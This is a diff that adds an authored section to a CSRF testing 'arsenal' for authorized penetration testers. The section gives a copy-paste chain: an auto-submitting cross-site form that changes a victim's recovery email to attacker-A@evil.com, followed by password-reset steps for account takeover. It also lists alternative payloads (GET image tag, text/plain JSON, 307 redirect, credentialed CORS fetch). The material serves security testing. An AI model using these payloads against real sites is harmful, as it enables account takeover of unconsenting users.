@@ -1,6 +1,51 @@
 # CSRF Attack Arsenal — PoC Templates, Bypass Strings & the SameSite Matrix
 
+**Author:** x8bitranjit
+
 > Companion to `CSRF_TESTING_GUIDE.md`. **Check the cookie's SameSite first** (guide §4) — it decides which of these can possibly work. Replace `target.com`, params, and `attacker@evil.com` (an inbox YOU control). **Always validate in a real default-settings browser, cross-site** (guide §19). Authorized targets + your own two test accounts only (guide §23).
+
+---
+
+## 0. The whole attack in one sequence (copy-paste — CSRF → change-email → ATO)
+
+*What & when:* the end-to-end flagship as one runnable narrative — the arsenal twin of guide **§11.1**. `B` is your own second account; the moment `B`'s account is yours, you **stop and restore**. **Do Step 0 first or you'll build a PoC SameSite silently blocks.**
+
+```
+# --- Step 0: the SameSite GATE (guide §4) — DevTools -> Application -> Cookies on target.com ---
+#   session cookie SameSite=None  -> classic cross-site POST works; use the auto-submit form (Step 1).
+#   session cookie SameSite=Lax   -> cross-site POST is DEAD; pivot to a GET state-change (§C) / redirect gadget (§6.6) / 307 (§6.7).
+#   Bearer/localStorage auth      -> NOT CSRF. Stop.
+#   Also confirm on POST /account/email: no CSRF token param, no X-Requested-With, Origin/Referer not checked.
+```
+```html
+<!-- Step 1: host on a DIFFERENT origin, e.g. https://attacker.com/poc.html (CSRF is cross-site) -->
+<form action="https://bank.example/account/email" method="POST">
+  <input type="hidden" name="email" value="attacker-A@evil.com">   <!-- an inbox YOU control -->
+</form>
+<script>document.forms[0].submit();</script>                         <!-- 0-click on load -->
+```
+```
+# --- Step 2: victim B (logged in, DEFAULT Chrome) opens poc.html. The browser sends, cross-site: ---
+#   POST /account/email  Origin: https://attacker.com  Cookie: <B's session>  (rides along iff SameSite=None)
+#   -> 302 /account   ==   B's recovery email is now attacker-A@evil.com  (no token demanded)
+
+# --- Step 3: A completes the takeover (B's recovery email is now A's inbox) ---
+#   POST /account/forgot {email:attacker-A@evil.com}  -> reset link to A's inbox
+#   POST /account/reset  {token:<from A's inbox>, password:PwnedByCSRF-2026!}
+#   POST /login          {email:attacker-A@evil.com, password:PwnedByCSRF-2026!}  -> inside B
+
+# --- Step 4: VALIDITY GATE + STOP: re-run poc.html in STOCK Chrome (no chrome://flags) as B, screenshot the
+#     email changing. That screenshot is the report. Restore B's email. CWE-352, High (ATO).
+```
+
+**Alternate cash-outs (same "prove it in a default browser, then stop" ending — pick by what the SameSite gate allows):**
+```
+GET state-change under Lax (§C/§6.1):   <img src="https://bank.example/account/email?email=attacker-A@evil.com">
+JSON API, text/plain trick (§D/§8):     <form> body '{"email":"attacker-A@evil.com"}' via enctype=text/plain padding
+SameSite=Strict, on-site gadget (§6.6): chain an open-redirect/routing gadget ON target.com so the request is same-site
+307 method-preserving redirect (§6.7):  attacker 307 -> target re-issues the POST body cross-site
+CORS ACAO-reflected + ACAC:true (§F/§17): credentialed fetch() with custom headers/JSON AND read the response
+```
 
 ---
 
